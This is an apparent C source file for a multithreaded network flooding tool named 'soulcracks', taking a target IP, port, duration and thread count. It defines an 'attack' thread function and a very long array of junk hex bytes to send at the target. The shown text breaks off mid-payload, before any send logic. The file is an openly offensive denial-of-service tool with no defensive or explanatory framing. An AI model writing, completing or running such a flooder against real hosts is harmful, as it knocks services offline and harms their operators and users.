#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./soulcracks ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {   "\xa0\xb1\xc2\xd3\xe4\xf5\xab\xcd\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x00\xff\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x00\xff\x00\xff\xab\xcd\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\xab\xcd\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\xab\xcd\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\xab\xcd\x00\xff\xab\xcd\xab\xcd\xab\xcd\x00\xff\x00\xff\x00\xff\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xab\xcd\x00\xff\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xab\xcd\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x01\x02\x03\x04\x05\x06\x00\xff\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xab\xcd\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xab\xcd\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xde\xad\xbe\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x00\xff\xab\xcd\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xab\xcd\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\x00\xff\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\x00\xff\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x00\xff\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\x00\xff\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\xab\xcd\xab\xcd\x00\xff\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x00\xff\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xab\xcd\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x00\xff\xab\xcd\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x00\xff\xab\xcd\x00\xff\xab\xcd\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\xab\xcd\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x02\x03\x04\x05\x06\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\x00\xff\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\xde\xad\xbe\xef\x00\xff\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\xab\xcd\x00\xff\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\x00\xff\xab\xcd\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x00\xff\xab\xcd\x00\xff\x00\xff\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\x00\xff\x00\xff\xab\xcd\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\xab\xcd\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x00\xff\xab\xcd\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xab\xcd\x00\xff\x00\xff\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x00\xff\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\x00\xff\x00\xff\xab\xcd\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\xde\xad\xbe\xef\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x00\xff\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\x00\xff\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x00\xff\xab\xcd\x00\xff\xab\xcd\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\xab\xcd\xab\xcd\x00\xff\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xab\xcd\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\x00\xff\xab\xcd\xde\xad\xbe\xef\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x00\xff\x00\xff\x00\xff\xde\xad\xbe\xef\x00\xff\x00\xff\xab\xcd\xde\xad\xbe\xef\x00\xff\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\x00\xff\xde\xad\xbe\xef\xab\xcd\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x00\xff\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xab\xcd\xab\xcd\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xab\xcd\x00\xff\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xab\xcd\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\xab\xcd\xab\xcd\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\xab\xcd\xab\xcd\x00\xff\x00\xff\x00\xff\xde\xad\xbe\xef\x01\x23\x45\x67\x89\xab\xcd\xef\xde\xad\xbe\xef\x00\xff\xde\xad\xbe\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\x00\xff\x01\x23\x45\x67\x89\xab\xcd\xef\